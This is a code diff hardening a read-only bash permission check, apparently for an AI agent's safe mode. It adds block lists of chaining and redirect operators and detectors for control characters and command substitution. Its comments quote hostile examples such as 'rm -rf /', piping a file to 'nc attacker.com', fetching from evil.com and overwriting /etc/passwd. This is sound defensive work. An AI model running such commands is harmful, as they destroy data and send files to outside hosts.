@@ -11,6 +11,7 @@
  */
 
 import { homedir } from 'os';
+import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
 import { debug } from '../utils/debug.ts';
 import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
 import {
@@ -210,7 +211,7 @@ export const SAFE_MODE_CONFIG: ModeConfig = {
     /^hostname\b/,
     /^date\b/,
     /^uptime\b/,
-    /^env\b/,
+    /^env$/,  // Only bare 'env' to print vars, NOT 'env <command>'
     /^printenv\b/,
     /^echo\s+\$/,  // echo $VAR (reading env vars)
     /^ps\b/,
@@ -234,7 +235,8 @@ export const SAFE_MODE_CONFIG: ModeConfig = {
     /^kubectl\s+(get|describe|logs|top|explain|api-resources|api-versions|cluster-info|config\s+view|config\s+get-contexts|version)\b/,
 
     // Text processing (read-only)
-    /^awk\b/,
+    // NOTE: awk is NOT safe - it can execute shell commands via system(), getline, print|
+    // Users can add it to permissions.json if they accept the risk
     /^sed\s+-n\b/,  // sed -n (print only, no editing)
     /^sort\b/,
     /^uniq\b/,
@@ -485,12 +487,237 @@ export function cleanupModeState(sessionId: string): void {
  */
 type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;
 
+// ============================================================
+// Command Chaining Detection (Security)
+// ============================================================
+
 /**
- * Check if a Bash command is read-only using the given config
+ * Operators that chain multiple commands together.
+ * These are dangerous because they allow executing arbitrary commands
+ * after a "safe" prefix like: `ls && rm -rf /`
+ */
+export const DANGEROUS_CHAIN_OPERATORS = new Set([
+  '&&',   // AND - second command runs if first succeeds
+  '||',   // OR - second command runs if first fails
+  ';',    // Sequence - always runs second command
+  '|',    // Pipe - connects stdout to stdin (can chain to dangerous commands)
+  '&',    // Background - runs command in background
+  '|&',   // Pipe stderr - bash extension
+]);
+
+/**
+ * Operators that write to files.
+ * These are dangerous because they can overwrite/modify files.
+ */
+export const DANGEROUS_REDIRECT_OPERATORS = new Set([
+  '>',    // Overwrite file
+  '>>',   // Append to file
+  '>&',   // Redirect stderr to file
+]);
+
+/**
+ * Extract the operator string from a shell-quote operator token.
+ * shell-quote returns operators as objects with an `op` property.
+ * Returns undefined if not an operator.
+ */
+function getOperator(token: ParseEntry): string | undefined {
+  if (typeof token === 'object' && token !== null && 'op' in token) {
+    return token.op;
+  }
+  return undefined;
+}
+
+/**
+ * Check if a command contains dangerous shell operators (command chaining or redirects).
+ *
+ * This prevents attacks like:
+ * - `ls && rm -rf /` (command chaining)
+ * - `cat file | nc attacker.com 1234` (piping to network)
+ * - `echo "data" > /etc/passwd` (file overwrite)
+ *
+ * Uses shell-quote to properly parse the command, handling edge cases like:
+ * - Quoted strings: `ls "&&"` is safe (the && is a literal string)
+ * - Escaped chars: `ls \&\&` is safe (escaped)
+ *
+ * @param command - The bash command to check
+ * @returns true if command contains dangerous operators, false if safe
+ */
+export function hasDangerousShellOperators(command: string): boolean {
+  try {
+    const parsed = parseShellCommand(command);
+
+    for (const token of parsed) {
+      const op = getOperator(token);
+      if (op) {
+        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
+          debug(`[Mode] Dangerous chain operator detected: "${op}" in command: ${command}`);
+          return true;
+        }
+        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
+          debug(`[Mode] Dangerous redirect operator detected: "${op}" in command: ${command}`);
+          return true;
+        }
+      }
+    }
+
+    return false;
+  } catch (error) {
+    // Parse error - assume dangerous (fail closed)
+    debug(`[Mode] Shell parse error for command "${command}":`, error);
+    return true;
+  }
+}
+
+/**
+ * Control characters that act as command separators or could be used for injection.
+ * These are dangerous because they can terminate the "safe" command and start a new one.
+ */
+const DANGEROUS_CONTROL_CHARS = new Set([
+  '\n',    // Newline - acts as command separator in bash
+  '\r',    // Carriage return - can act as newline
+  '\x00',  // Null byte - can truncate strings in some contexts
+]);
+
+/**
+ * Check if a command contains dangerous control characters.
+ *
+ * Newlines and carriage returns act as command separators in bash:
+ * - `ls\nrm -rf /` executes both ls and rm
+ *
+ * @param command - The bash command to check
+ * @returns true if command contains dangerous control chars, false if safe
+ */
+export function hasDangerousControlChars(command: string): boolean {
+  for (const char of command) {
+    if (DANGEROUS_CONTROL_CHARS.has(char)) {
+      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
+      return true;
+    }
+  }
+  return false;
+}
+
+/**
+ * Check if a command contains dangerous command/process substitution patterns.
+ *
+ * Detects:
+ * - Command substitution: $(...) or `...` (backticks)
+ * - Process substitution: <(...) or >(...)
+ *
+ * These are dangerous because they execute arbitrary commands:
+ * - `ls $(rm -rf /)` - the rm runs during argument expansion
+ * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
+ * - `cat <(curl http://evil.com)` - process substitution runs curl
+ *
+ * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
+ *
+ * @param command - The bash command to check
+ * @returns true if command contains dangerous substitution, false if safe
+ */
+export function hasDangerousSubstitution(command: string): boolean {
+  let inSingleQuote = false;
+  let escaped = false;
+
+  for (let i = 0; i < command.length; i++) {
+    const char = command[i];
+    const nextChar = command[i + 1];
+
+    // Handle escape sequences (only outside single quotes)
+    if (escaped) {
+      escaped = false;
+      continue;
+    }
+
+    if (char === '\\' && !inSingleQuote) {
+      escaped = true;
+      continue;
+    }
+
+    // Track single quote state (double quotes don't protect against substitution)
+    if (char === "'" && !escaped) {
+      inSingleQuote = !inSingleQuote;
+      continue;
+    }
+
+    // Only check for dangerous patterns outside single quotes
+    if (!inSingleQuote) {
+      // Command substitution: $(
+      if (char === '$' && nextChar === '(') {
+        debug(`[Mode] Command substitution $() detected in: ${command}`);
+        return true;
+      }
+
+      // Backtick command substitution
+      if (char === '`') {
+        debug(`[Mode] Backtick substitution detected in: ${command}`);
+        return true;
+      }
+
+      // Process substitution: <( or >(
+      if ((char === '<' || char === '>') && nextChar === '(') {
+        debug(`[Mode] Process substitution detected in: ${command}`);
+        return true;
+      }
+    }
+  }
+
+  return false;
+}
+
+/**
+ * Check if a Bash command is read-only using the given config.
+ *
+ * A command is considered safe if:
+ * 1. It does NOT contain dangerous control characters (newlines, etc.)
+ * 2. It matches one of the read-only patterns (e.g., starts with `ls`, `cat`, `git status`)
+ * 3. It does NOT contain dangerous shell operators (&&, ||, ;, |, >, >>)
+ * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
+ *
+ * This multi-step check prevents attacks like:
+ * - `ls\nrm -rf /` (newline injection)
+ * - `ls && rm -rf /` (command chaining)
+ * - `ls $(rm -rf /)` (command substitution)
+ * - `cat <(curl http://evil.com)` (process substitution)
  */
 function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
   const trimmedCommand = command.trim();
-  return config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
+
+  // Step 1: Reject commands with dangerous control characters (newlines act as command separators)
+  if (hasDangerousControlChars(trimmedCommand)) {
+    debug(`[Mode] Command contains dangerous control characters`);
+    return false;
+  }
+
+  // Step 2: Check if command matches a safe prefix pattern
+  const matchesSafePattern = config.readOnlyBashPatterns.some(pattern => pattern.test(trimmedCommand));
+  if (!matchesSafePattern) {
+    return false;
+  }
+
+  // Step 3: Verify no dangerous operators (prevents chaining attacks)
+  if (hasDangerousShellOperators(trimmedCommand)) {
+    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous operators`);
+    return false;
+  }
+
+  // Step 4: Verify no command/process substitution (prevents embedded command execution)
+  if (hasDangerousSubstitution(trimmedCommand)) {
+    debug(`[Mode] Command "${trimmedCommand}" matches safe pattern but contains dangerous substitution`);
+    return false;
+  }
+
+  return true;
+}
+
+/**
+ * Check if a Bash command is read-only using the default safe mode config.
+ * Exported for testing.
+ *
+ * @param command - The bash command to check
+ * @returns true if command is safe to run in read-only mode
+ */
+export function isReadOnlyBashCommand(command: string): boolean {
+  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
 }
 
 /**
